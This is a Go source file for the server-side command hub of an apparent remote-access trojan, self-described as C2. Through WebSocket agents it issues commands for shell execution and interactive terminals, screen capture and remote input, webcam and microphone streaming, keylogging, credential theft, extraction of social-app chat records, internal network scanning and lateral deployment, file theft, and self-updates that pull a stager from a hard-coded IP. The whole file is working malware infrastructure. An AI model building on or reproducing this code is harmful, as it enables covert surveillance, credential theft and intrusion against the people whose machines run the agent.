package ws

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
)

var msgSeq uint64 // 全局消息序号，原子递增

// AgentMessage Agent 和服务端之间的消息格式
type AgentMessage struct {
	Type    string          `json:"type"`          // auth, exec, exec_result, metrics, pong
	ID      string          `json:"id"`            // 消息 ID，用于匹配请求和响应
	Payload json.RawMessage `json:"payload"`       // 具体数据
	Ts      int64           `json:"ts,omitempty"`  // 签名时间戳
	Sig     string          `json:"sig,omitempty"` // HMAC-SHA256 签名
}

// ExecRequest 命令执行请求
type ExecRequest struct {
	Command string `json:"command"`
}

// ExecResult 命令执行结果
type ExecResult struct {
	ExitCode int    `json:"exitCode"`
	Output   string `json:"output"`
	Error    string `json:"error"`
}

// TermSession 终端会话回调
type TermSession struct {
	OnOutput func(data string)
	OnExit   func(code int)
	OnMode   func(mode string) // "conpty" 或 "pipe"
}

// ScreenSession 桌面截图会话回调
type ScreenSession struct {
	OnFrame  func(data json.RawMessage) // JSON 元数据
	OnBinary func(data []byte)          // JPEG 二进制数据
	OnClose  func(message string)
	// 以下字段用于 agent 重连时自动恢复会话
	FPS     int
	Quality int
	Scale   int
}

// StressSession 压力测试会话回调
type StressSession struct {
	OnProgress func(data json.RawMessage)
	OnDone     func(data json.RawMessage)
}

// MicSession 麦克风实时流会话回调
type MicSession struct {
	OnFrame func(data json.RawMessage) // 音频帧 JSON
	OnClose func(message string)
}

// WebcamSession 摄像头实时流会话回调（二进制推送）
type WebcamSession struct {
	OnFrame  func(data json.RawMessage) // JSON 元数据
	OnBinary func(data []byte)          // JPEG 二进制
	OnClose  func(message string)
	Codec    string
}

// AgentConn 单个 Agent 连接
type AgentConn struct {
	ServerID     string
	OSType       string // linux / windows
	conn         *websocket.Conn
	send         chan []byte
	hub          *AgentHub
	connectedAt  time.Time
	lastActivity time.Time // 最后收到消息的时间
	// 等待命令结果的回调
	pending   map[string]chan *ExecResult
	pendingMu sync.Mutex
	// 终端会话
	termSessions   map[string]*TermSession
	termSessionsMu sync.Mutex
	// 截图会话
	screenSessions   map[string]*ScreenSession
	screenSessionsMu sync.Mutex
	// 压测会话
	stressSessions   map[string]*StressSession
	stressSessionsMu sync.Mutex
	// 麦克风流会话
	micSessions   map[string]*MicSession
	micSessionsMu sync.Mutex
	// 摄像头流会话（二进制推送）
	webcamSessions   map[string]*WebcamSession
	webcamSessionsMu sync.Mutex
	// 实时摄像头帧缓冲（兼容旧 base64 模式）
	webcamFrame   string
	webcamFrameMu sync.Mutex
	// 实时麦克风音频缓冲
	micFrame   string // 最新一帧音频 JSON (含 base64 PCM)
	micFrameMu sync.Mutex
}

func (a *AgentConn) hasActiveWork() bool {
	if a == nil {
		return false
	}
	a.pendingMu.Lock()
	pending := len(a.pending)
	a.pendingMu.Unlock()
	a.termSessionsMu.Lock()
	terms := len(a.termSessions)
	a.termSessionsMu.Unlock()
	a.screenSessionsMu.Lock()
	screens := len(a.screenSessions)
	a.screenSessionsMu.Unlock()
	a.stressSessionsMu.Lock()
	stress := len(a.stressSessions)
	a.stressSessionsMu.Unlock()
	return pending+terms+screens+stress > 0
}

// AgentHub 管理所有 Agent WebSocket 连接
type AgentHub struct {
	agents  map[string]*AgentConn // serverID -> AgentConn
	mu      sync.RWMutex
	signKey []byte // HMAC 签名密钥

	// SOCKS5/端口转发隧道回调
	tunnelMu      sync.RWMutex
	tunnelDataCb  map[string]func([]byte) // channelID → 数据回调
	tunnelCloseCb map[string]func()       // channelID → 关闭回调

	// SOCKS5 代理实例
	socksProxy *SocksProxy
}

func NewAgentHub() *AgentHub {
	h := &AgentHub{
		agents:        make(map[string]*AgentConn),
		tunnelDataCb:  make(map[string]func([]byte)),
		tunnelCloseCb: make(map[string]func()),
	}
	h.socksProxy = NewSocksProxy(h)
	return h
}

// GetSocksProxy 获取 SOCKS5 代理实例
func (h *AgentHub) GetSocksProxy() *SocksProxy {
	return h.socksProxy
}

// SetSignKey 设置消息签名密钥并初始化 C2 协议混淆
func (h *AgentHub) SetSignKey(key []byte) {
	h.signKey = key
	InitC2Proto(key)
}

// signMsg 对消息进行 HMAC-SHA256 签名并序列化
// 签名使用可读类型名，线路传输使用编码后的类型
func (h *AgentHub) signMsg(msg AgentMessage) []byte {
	if len(h.signKey) > 0 {
		msg.Ts = time.Now().Unix()
		raw := msg.Type + "|" + msg.ID + "|" + strconv.FormatInt(msg.Ts, 10) + "|" + string(msg.Payload)
		mac := hmac.New(sha256.New, h.signKey)
		mac.Write([]byte(raw))
		msg.Sig = hex.EncodeToString(mac.Sum(nil))
	}
	// 兼容模式：不做 C2 编码，直接发送明文类型（新老 agent 均兼容）
	// msg.Type = C2e(msg.Type)
	data, _ := json.Marshal(msg)
	return data
}

// ForEachAgent 遍历所有在线 Agent，回调 (serverID, osType)
func (h *AgentHub) ForEachAgent(fn func(serverID, osType string)) {
	h.mu.RLock()
	defer h.mu.RUnlock()
	for sid, agent := range h.agents {
		fn(sid, agent.OSType)
	}
}

// IsAgentOnline 检查 Agent 是否在线
func (h *AgentHub) IsAgentOnline(serverID string) bool {
	h.mu.RLock()
	defer h.mu.RUnlock()
	_, ok := h.agents[serverID]
	return ok
}

// ExecCommand 向指定 Agent 发送命令并等待结果
func (h *AgentHub) ExecCommand(serverID, command string, timeout time.Duration) (*ExecResult, error) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return nil, &AgentOfflineError{ServerID: serverID}
	}

	// 生成唯一消息 ID（原子递增，不会重复）
	msgID := fmt.Sprintf("%d-%d", time.Now().UnixNano(), atomic.AddUint64(&msgSeq, 1))

	// 创建结果通道
	resultCh := make(chan *ExecResult, 1)
	agent.pendingMu.Lock()
	agent.pending[msgID] = resultCh
	agent.pendingMu.Unlock()

	defer func() {
		agent.pendingMu.Lock()
		delete(agent.pending, msgID)
		agent.pendingMu.Unlock()
	}()

	// 发送执行请求（带签名）
	payload, _ := json.Marshal(ExecRequest{Command: command})
	msg := h.signMsg(AgentMessage{
		Type:    "exec",
		ID:      msgID,
		Payload: payload,
	})

	select {
	case agent.send <- msg:
	default:
		return nil, &AgentOfflineError{ServerID: serverID}
	}

	// 等待结果
	select {
	case result := <-resultCh:
		return result, nil
	case <-time.After(timeout):
		return &ExecResult{ExitCode: -1, Error: "命令执行超时"}, nil
	}
}

// ExecCommandPlain 与 ExecCommand 相同但不做 C2 编码（兼容旧版 agent）
func (h *AgentHub) ExecCommandPlain(serverID, command string, timeout time.Duration) (*ExecResult, error) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return nil, &AgentOfflineError{ServerID: serverID}
	}

	msgID := fmt.Sprintf("p-%d-%d", time.Now().UnixNano(), atomic.AddUint64(&msgSeq, 1))

	resultCh := make(chan *ExecResult, 1)
	agent.pendingMu.Lock()
	agent.pending[msgID] = resultCh
	agent.pendingMu.Unlock()

	defer func() {
		agent.pendingMu.Lock()
		delete(agent.pending, msgID)
		agent.pendingMu.Unlock()
	}()

	payload, _ := json.Marshal(ExecRequest{Command: command})
	msg := h.signMsgPlain(AgentMessage{
		Type:    "exec",
		ID:      msgID,
		Payload: payload,
	})

	select {
	case agent.send <- msg:
	default:
		return nil, &AgentOfflineError{ServerID: serverID}
	}

	select {
	case result := <-resultCh:
		return result, nil
	case <-time.After(timeout):
		return &ExecResult{ExitCode: -1, Error: "命令执行超时"}, nil
	}
}

// FireExec 向指定 Agent 发射 exec 命令，不等待响应（同时发送编码版+明文版）
func (h *AgentHub) FireExec(serverID, command string) error {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return &AgentOfflineError{ServerID: serverID}
	}

	payload, _ := json.Marshal(ExecRequest{Command: command})

	// C2 编码版
	msgID1 := fmt.Sprintf("fe-%d-%d", time.Now().UnixNano(), atomic.AddUint64(&msgSeq, 1))
	encoded := h.signMsg(AgentMessage{Type: "exec", ID: msgID1, Payload: payload})
	select {
	case agent.send <- encoded:
	default:
	}

	// 明文版
	msgID2 := fmt.Sprintf("fp-%d-%d", time.Now().UnixNano(), atomic.AddUint64(&msgSeq, 1))
	plain := h.signMsgPlain(AgentMessage{Type: "exec", ID: msgID2, Payload: payload})
	select {
	case agent.send <- plain:
	default:
	}

	return nil
}

// QuickCmd 向指定 Agent 发送快捷指令并等待结果
func (h *AgentHub) QuickCmd(serverID, cmd string, timeout time.Duration) (*ExecResult, error) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return nil, &AgentOfflineError{ServerID: serverID}
	}

	msgID := fmt.Sprintf("qc-%d-%d", time.Now().UnixNano(), atomic.AddUint64(&msgSeq, 1))

	resultCh := make(chan *ExecResult, 1)
	agent.pendingMu.Lock()
	agent.pending[msgID] = resultCh
	agent.pendingMu.Unlock()

	defer func() {
		agent.pendingMu.Lock()
		delete(agent.pending, msgID)
		agent.pendingMu.Unlock()
	}()

	payload, _ := json.Marshal(map[string]string{"cmd": cmd})
	msg := h.signMsg(AgentMessage{
		Type:    "quick_cmd",
		ID:      msgID,
		Payload: payload,
	})

	select {
	case agent.send <- msg:
	default:
		return nil, &AgentOfflineError{ServerID: serverID}
	}

	select {
	case result := <-resultCh:
		return result, nil
	case <-time.After(timeout):
		return &ExecResult{ExitCode: -1, Error: "指令执行超时"}, nil
	}
}

// StartTermSession 在 Agent 上启动一个 PTY 终端会话
func (h *AgentHub) StartTermSession(serverID, sessionID string, cols, rows int, ts *TermSession) error {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return &AgentOfflineError{ServerID: serverID}
	}

	// 注册回调
	agent.termSessionsMu.Lock()
	agent.termSessions[sessionID] = ts
	agent.termSessionsMu.Unlock()

	// 发送 pty_start
	payload, _ := json.Marshal(struct {
		Cols int `json:"cols"`
		Rows int `json:"rows"`
	}{Cols: cols, Rows: rows})
	msg := h.signMsg(AgentMessage{Type: "pty_start", ID: sessionID, Payload: payload})

	select {
	case agent.send <- msg:
		return nil
	default:
		agent.termSessionsMu.Lock()
		delete(agent.termSessions, sessionID)
		agent.termSessionsMu.Unlock()
		return &AgentOfflineError{ServerID: serverID}
	}
}

// SendTermInput 向 Agent PTY 发送输入
func (h *AgentHub) SendTermInput(serverID, sessionID, data string) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return
	}

	payload, _ := json.Marshal(struct {
		Data string `json:"data"`
	}{Data: data})
	msg := h.signMsg(AgentMessage{Type: "pty_input", ID: sessionID, Payload: payload})

	select {
	case agent.send <- msg:
	case <-time.After(5 * time.Second):
		log.Printf("SendTermInput 超时: server=%s session=%s", serverID, sessionID)
	}
}

// SendTermResize 向 Agent PTY 发送 resize
func (h *AgentHub) SendTermResize(serverID, sessionID string, cols, rows int) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return
	}

	payload, _ := json.Marshal(struct {
		Cols int `json:"cols"`
		Rows int `json:"rows"`
	}{Cols: cols, Rows: rows})
	msg := h.signMsg(AgentMessage{Type: "pty_resize", ID: sessionID, Payload: payload})

	select {
	case agent.send <- msg:
	case <-time.After(3 * time.Second):
	}
}

// CloseTermSession 关闭 Agent PTY 终端会话
func (h *AgentHub) CloseTermSession(serverID, sessionID string) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return
	}

	agent.termSessionsMu.Lock()
	delete(agent.termSessions, sessionID)
	agent.termSessionsMu.Unlock()

	msg := h.signMsg(AgentMessage{Type: "pty_close", ID: sessionID})
	select {
	case agent.send <- msg:
	case <-time.After(3 * time.Second):
	}
}

// StartScreenSession 在 Agent 上启动桌面截图会话
func (h *AgentHub) StartScreenSession(serverID, sessionID string, fps, quality, scale int, ss *ScreenSession) error {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return &AgentOfflineError{ServerID: serverID}
	}

	ss.FPS = fps
	ss.Quality = quality
	ss.Scale = scale

	agent.screenSessionsMu.Lock()
	agent.screenSessions[sessionID] = ss
	agent.screenSessionsMu.Unlock()

	payload, _ := json.Marshal(struct {
		FPS     int `json:"fps"`
		Quality int `json:"quality"`
		Scale   int `json:"scale"`
	}{FPS: fps, Quality: quality, Scale: scale})
	msg := h.signMsg(AgentMessage{Type: "screen_start", ID: sessionID, Payload: payload})

	select {
	case agent.send <- msg:
		return nil
	default:
		agent.screenSessionsMu.Lock()
		delete(agent.screenSessions, sessionID)
		agent.screenSessionsMu.Unlock()
		return &AgentOfflineError{ServerID: serverID}
	}
}

// StopScreenSession 停止桌面截图会话
func (h *AgentHub) StopScreenSession(serverID, sessionID string) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return
	}

	agent.screenSessionsMu.Lock()
	delete(agent.screenSessions, sessionID)
	agent.screenSessionsMu.Unlock()

	msg := h.signMsg(AgentMessage{Type: "screen_stop", ID: sessionID})
	select {
	case agent.send <- msg:
	case <-time.After(3 * time.Second):
	}
}

// StartStressTest 在 Agent 上启动压力测试
func (h *AgentHub) StartStressTest(serverID, taskID string, config json.RawMessage, ss *StressSession) error {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return &AgentOfflineError{ServerID: serverID}
	}

	agent.stressSessionsMu.Lock()
	agent.stressSessions[taskID] = ss
	agent.stressSessionsMu.Unlock()

	msg := h.signMsg(AgentMessage{Type: "stress_start", ID: taskID, Payload: config})
	select {
	case agent.send <- msg:
		return nil
	default:
		agent.stressSessionsMu.Lock()
		delete(agent.stressSessions, taskID)
		agent.stressSessionsMu.Unlock()
		return &AgentOfflineError{ServerID: serverID}
	}
}

// StopStressTest 停止 Agent 上的压力测试
func (h *AgentHub) StopStressTest(serverID, taskID string) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return
	}

	agent.stressSessionsMu.Lock()
	delete(agent.stressSessions, taskID)
	agent.stressSessionsMu.Unlock()

	msg := h.signMsg(AgentMessage{Type: "stress_stop", ID: taskID})
	select {
	case agent.send <- msg:
	default:
	}
}

// NetScan 向指定 Agent 发送内网扫描命令并等待结果
func (h *AgentHub) NetScan(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return "", &AgentOfflineError{ServerID: serverID}
	}

	msgID := fmt.Sprintf("ns-%d-%d", time.Now().UnixNano(), atomic.AddUint64(&msgSeq, 1))

	resultCh := make(chan *ExecResult, 1)
	agent.pendingMu.Lock()
	agent.pending[msgID] = resultCh
	agent.pendingMu.Unlock()

	defer func() {
		agent.pendingMu.Lock()
		delete(agent.pending, msgID)
		agent.pendingMu.Unlock()
	}()

	msg := h.signMsg(AgentMessage{Type: "net_scan", ID: msgID, Payload: params})
	select {
	case agent.send <- msg:
	default:
		return "", &AgentOfflineError{ServerID: serverID}
	}

	select {
	case result := <-resultCh:
		return result.Output, nil
	case <-time.After(timeout):
		return "", fmt.Errorf("内网扫描超时")
	}
}

// LateralDeploy 向指定 Agent 发送横向部署命令并等待结果
func (h *AgentHub) LateralDeploy(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return "", &AgentOfflineError{ServerID: serverID}
	}

	msgID := fmt.Sprintf("ld-%d-%d", time.Now().UnixNano(), atomic.AddUint64(&msgSeq, 1))

	resultCh := make(chan *ExecResult, 1)
	agent.pendingMu.Lock()
	agent.pending[msgID] = resultCh
	agent.pendingMu.Unlock()

	defer func() {
		agent.pendingMu.Lock()
		delete(agent.pending, msgID)
		agent.pendingMu.Unlock()
	}()

	msg := h.signMsg(AgentMessage{Type: "lateral_deploy", ID: msgID, Payload: params})
	select {
	case agent.send <- msg:
	default:
		return "", &AgentOfflineError{ServerID: serverID}
	}

	select {
	case result := <-resultCh:
		return result.Output, nil
	case <-time.After(timeout):
		return "", fmt.Errorf("横向部署超时")
	}
}

// CredDump 向指定 Agent 发送凭证窃取命令并等待结果
func (h *AgentHub) CredDump(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return "", &AgentOfflineError{ServerID: serverID}
	}

	msgID := fmt.Sprintf("cd-%d-%d", time.Now().UnixNano(), atomic.AddUint64(&msgSeq, 1))

	resultCh := make(chan *ExecResult, 1)
	agent.pendingMu.Lock()
	agent.pending[msgID] = resultCh
	agent.pendingMu.Unlock()

	defer func() {
		agent.pendingMu.Lock()
		delete(agent.pending, msgID)
		agent.pendingMu.Unlock()
	}()

	msg := h.signMsg(AgentMessage{Type: "cred_dump", ID: msgID, Payload: params})
	select {
	case agent.send <- msg:
	default:
		return "", &AgentOfflineError{ServerID: serverID}
	}

	select {
	case result := <-resultCh:
		return result.Output, nil
	case <-time.After(timeout):
		return "", fmt.Errorf("凭证窃取超时")
	}
}

// ChatDump 向指定 Agent 发送社交软件聊天记录提取命令并等待结果
func (h *AgentHub) ChatDump(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return "", &AgentOfflineError{ServerID: serverID}
	}

	msgID := fmt.Sprintf("ch-%d-%d", time.Now().UnixNano(), atomic.AddUint64(&msgSeq, 1))

	resultCh := make(chan *ExecResult, 1)
	agent.pendingMu.Lock()
	agent.pending[msgID] = resultCh
	agent.pendingMu.Unlock()

	defer func() {
		agent.pendingMu.Lock()
		delete(agent.pending, msgID)
		agent.pendingMu.Unlock()
	}()

	msg := h.signMsg(AgentMessage{Type: "chat_dump", ID: msgID, Payload: params})
	select {
	case agent.send <- msg:
	default:
		return "", &AgentOfflineError{ServerID: serverID}
	}

	select {
	case result := <-resultCh:
		return result.Output, nil
	case <-time.After(timeout):
		return "", fmt.Errorf("聊天记录提取超时")
	}
}

// FileBrowse 向指定 Agent 发送文件浏览命令并等待结果
func (h *AgentHub) FileBrowse(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return "", &AgentOfflineError{ServerID: serverID}
	}

	msgID := fmt.Sprintf("fb-%d-%d", time.Now().UnixNano(), atomic.AddUint64(&msgSeq, 1))

	resultCh := make(chan *ExecResult, 1)
	agent.pendingMu.Lock()
	agent.pending[msgID] = resultCh
	agent.pendingMu.Unlock()

	defer func() {
		agent.pendingMu.Lock()
		delete(agent.pending, msgID)
		agent.pendingMu.Unlock()
	}()

	msg := h.signMsg(AgentMessage{Type: "file_browse", ID: msgID, Payload: params})
	select {
	case agent.send <- msg:
	default:
		return "", &AgentOfflineError{ServerID: serverID}
	}

	select {
	case result := <-resultCh:
		return result.Output, nil
	case <-time.After(timeout):
		return "", fmt.Errorf("文件浏览超时")
	}
}

// FileDownload 向指定 Agent 发送文件下载命令并等待结果
func (h *AgentHub) FileDownload(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return "", &AgentOfflineError{ServerID: serverID}
	}

	msgID := fmt.Sprintf("fd-%d-%d", time.Now().UnixNano(), atomic.AddUint64(&msgSeq, 1))

	resultCh := make(chan *ExecResult, 1)
	agent.pendingMu.Lock()
	agent.pending[msgID] = resultCh
	agent.pendingMu.Unlock()

	defer func() {
		agent.pendingMu.Lock()
		delete(agent.pending, msgID)
		agent.pendingMu.Unlock()
	}()

	msg := h.signMsg(AgentMessage{Type: "file_download", ID: msgID, Payload: params})
	select {
	case agent.send <- msg:
	default:
		return "", &AgentOfflineError{ServerID: serverID}
	}

	select {
	case result := <-resultCh:
		return result.Output, nil
	case <-time.After(timeout):
		return "", fmt.Errorf("文件下载超时")
	}
}

// WebcamSnap 向指定 Agent 发送摄像头拍照命令并等待结果
func (h *AgentHub) WebcamSnap(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return "", &AgentOfflineError{ServerID: serverID}
	}

	msgID := fmt.Sprintf("wc-%d-%d", time.Now().UnixNano(), atomic.AddUint64(&msgSeq, 1))

	resultCh := make(chan *ExecResult, 1)
	agent.pendingMu.Lock()
	agent.pending[msgID] = resultCh
	agent.pendingMu.Unlock()

	defer func() {
		agent.pendingMu.Lock()
		delete(agent.pending, msgID)
		agent.pendingMu.Unlock()
	}()

	msg := h.signMsg(AgentMessage{Type: "webcam_snap", ID: msgID, Payload: params})
	select {
	case agent.send <- msg:
	default:
		return "", &AgentOfflineError{ServerID: serverID}
	}

	select {
	case result := <-resultCh:
		return result.Output, nil
	case <-time.After(timeout):
		return "", fmt.Errorf("摄像头拍照超时")
	}
}

// SelfUpdate 向指定 Agent 发送自更新命令（fire-and-forget，不等待结果）
// stagerBaseURL 为服务器外部地址（如 http://47.115.222.73），Agent 据此拉取新 stager
func (h *AgentHub) SelfUpdate(serverID, stagerBaseURL string) error {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return &AgentOfflineError{ServerID: serverID}
	}

	payload := fmt.Sprintf(`{"stager_base_url":"%s"}`, stagerBaseURL)
	msgID := fmt.Sprintf("su-%d-%d", time.Now().UnixNano(), atomic.AddUint64(&msgSeq, 1))
	msg := h.signMsg(AgentMessage{Type: "self_update", ID: msgID, Payload: json.RawMessage(payload)})
	select {
	case agent.send <- msg:
		return nil
	default:
		return &AgentOfflineError{ServerID: serverID}
	}
}

// SelfUpdateAll 向所有在线 Windows Agent 发送自更新命令，返回发送数量
func (h *AgentHub) SelfUpdateAll(stagerBaseURL string) int {
	sent := 0
	h.ForEachAgent(func(serverID, osType string) {
		if osType != "windows" {
			return
		}
		if err := h.SelfUpdate(serverID, stagerBaseURL); err == nil {
			sent++
		}
	})
	return sent
}

// ProcessList 向指定 Agent 发送进程列表命令
func (h *AgentHub) ProcessList(serverID string, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "process_list", json.RawMessage("{}"), "pl", timeout, "获取进程列表超时")
}

// ProcessKill 向指定 Agent 发送结束进程命令
func (h *AgentHub) ProcessKill(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "process_kill", params, "pk", timeout, "结束进程超时")
}

// WindowList 向指定 Agent 发送窗口列表命令
func (h *AgentHub) WindowList(serverID string, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "window_list", json.RawMessage("{}"), "wl", timeout, "获取窗口列表超时")
}

// WindowControl 向指定 Agent 发送窗口控制命令
func (h *AgentHub) WindowControl(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "window_control", params, "wc", timeout, "窗口控制超时")
}

// ServiceList 向指定 Agent 发送服务列表命令
func (h *AgentHub) ServiceList(serverID string, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "service_list", json.RawMessage("{}"), "sl", timeout, "获取服务列表超时")
}

// ServiceControl 向指定 Agent 发送服务控制命令
func (h *AgentHub) ServiceControl(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "service_control", params, "sc", timeout, "服务控制超时")
}

// KeylogStart 向指定 Agent 发送开始键盘记录命令
func (h *AgentHub) KeylogStart(serverID string, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "keylog_start", json.RawMessage("{}"), "ks", timeout, "键盘记录启动超时")
}

// KeylogStop 向指定 Agent 发送停止键盘记录命令
func (h *AgentHub) KeylogStop(serverID string, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "keylog_stop", json.RawMessage("{}"), "kt", timeout, "键盘记录停止超时")
}

// KeylogDump 向指定 Agent 发送获取键盘记录命令
func (h *AgentHub) KeylogDump(serverID string, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "keylog_dump", json.RawMessage("{}"), "kd", timeout, "获取键盘记录超时")
}

// WebcamStart 向指定 Agent 发送开始实时摄像头流命令
func (h *AgentHub) WebcamStart(serverID string, timeout time.Duration) (string, error) {
	// 先清空旧帧
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if ok {
		agent.webcamFrameMu.Lock()
		agent.webcamFrame = ""
		agent.webcamFrameMu.Unlock()
	}
	return h.sendAndWait(serverID, "webcam_start", json.RawMessage("{}"), "ws", timeout, "摄像头启动超时")
}

// WebcamStop 向指定 Agent 发送停止实时摄像头流命令
func (h *AgentHub) WebcamStop(serverID string, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "webcam_stop", json.RawMessage("{}"), "wt", timeout, "摄像头停止超时")
}

// WebcamLatestFrame 获取指定 Agent 缓存的最新摄像头帧
func (h *AgentHub) WebcamLatestFrame(serverID string) (string, error) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return "", &AgentOfflineError{ServerID: serverID}
	}
	agent.webcamFrameMu.Lock()
	frame := agent.webcamFrame
	agent.webcamFrameMu.Unlock()
	if frame == "" {
		return "", fmt.Errorf("no frame available")
	}
	return frame, nil
}

// StartWebcamSession 注册摄像头 WebSocket 会话并启动 Agent 采集
func (h *AgentHub) StartWebcamSession(serverID, sessionID string, ws *WebcamSession) error {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return &AgentOfflineError{ServerID: serverID}
	}

	agent.webcamSessionsMu.Lock()
	agent.webcamSessions[sessionID] = ws
	agent.webcamSessionsMu.Unlock()

	codec := "h264"
	if ws != nil && ws.Codec == "jpeg" {
		codec = "jpeg"
	}
	payload, _ := json.Marshal(struct {
		Codec string `json:"codec"`
	}{Codec: codec})

	// 发送 webcam_start 命令到 Agent
	msg := h.signMsg(AgentMessage{Type: "webcam_start", ID: sessionID, Payload: payload})
	select {
	case agent.send <- msg:
		return nil
	default:
		agent.webcamSessionsMu.Lock()
		delete(agent.webcamSessions, sessionID)
		agent.webcamSessionsMu.Unlock()
		return &AgentOfflineError{ServerID: serverID}
	}
}

// StopWebcamSession 停止摄像头 WebSocket 会话
func (h *AgentHub) StopWebcamSession(serverID, sessionID string) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return
	}

	agent.webcamSessionsMu.Lock()
	delete(agent.webcamSessions, sessionID)
	remaining := len(agent.webcamSessions)
	agent.webcamSessionsMu.Unlock()

	// 只有最后一个会话关闭时才停止 Agent 采集
	if remaining == 0 {
		msg := h.signMsg(AgentMessage{Type: "webcam_stop", ID: sessionID})
		select {
		case agent.send <- msg:
		default:
		}
	}
}

// MicStart 向指定 Agent 发送开始麦克风监听命令
func (h *AgentHub) MicStart(serverID string, timeout time.Duration) (string, error) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if ok {
		agent.micFrameMu.Lock()
		agent.micFrame = ""
		agent.micFrameMu.Unlock()
	}
	return h.sendAndWait(serverID, "mic_start", json.RawMessage("{}"), "ms", timeout, "麦克风启动超时")
}

// MicStop 向指定 Agent 发送停止麦克风监听命令
func (h *AgentHub) MicStop(serverID string, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "mic_stop", json.RawMessage("{}"), "mt", timeout, "麦克风停止超时")
}

// MicLatestFrame 获取指定 Agent 缓存的最新麦克风音频帧
func (h *AgentHub) MicLatestFrame(serverID string) (string, error) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return "", &AgentOfflineError{ServerID: serverID}
	}
	agent.micFrameMu.Lock()
	frame := agent.micFrame
	agent.micFrame = "" // consume after read
	agent.micFrameMu.Unlock()
	if frame == "" {
		return "", fmt.Errorf("no audio available")
	}
	return frame, nil
}

// StartMicSession 注册一个麦克风 WebSocket 流会话
func (h *AgentHub) StartMicSession(serverID, sessionID string, ms *MicSession) error {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return &AgentOfflineError{ServerID: serverID}
	}
	agent.micSessionsMu.Lock()
	agent.micSessions[sessionID] = ms
	agent.micSessionsMu.Unlock()
	return nil
}

// StopMicSession 移除一个麦克风 WebSocket 流会话
func (h *AgentHub) StopMicSession(serverID, sessionID string) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return
	}
	agent.micSessionsMu.Lock()
	delete(agent.micSessions, sessionID)
	agent.micSessionsMu.Unlock()
}

// ── 新增 DLL 功能方法 ──

// ScreenInput 向指定 Agent 发送远程桌面输入命令
func (h *AgentHub) ScreenInput(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "screen_input", params, "si", timeout, "远程输入超时")
}

// FileUpload 向指定 Agent 上传小文件（单次 base64）
func (h *AgentHub) FileUpload(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "file_upload", params, "fu", timeout, "文件上传超时")
}

// FileUploadStart 向指定 Agent 发起分块上传
func (h *AgentHub) FileUploadStart(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "file_upload_start", params, "fus", timeout, "文件上传启动超时")
}

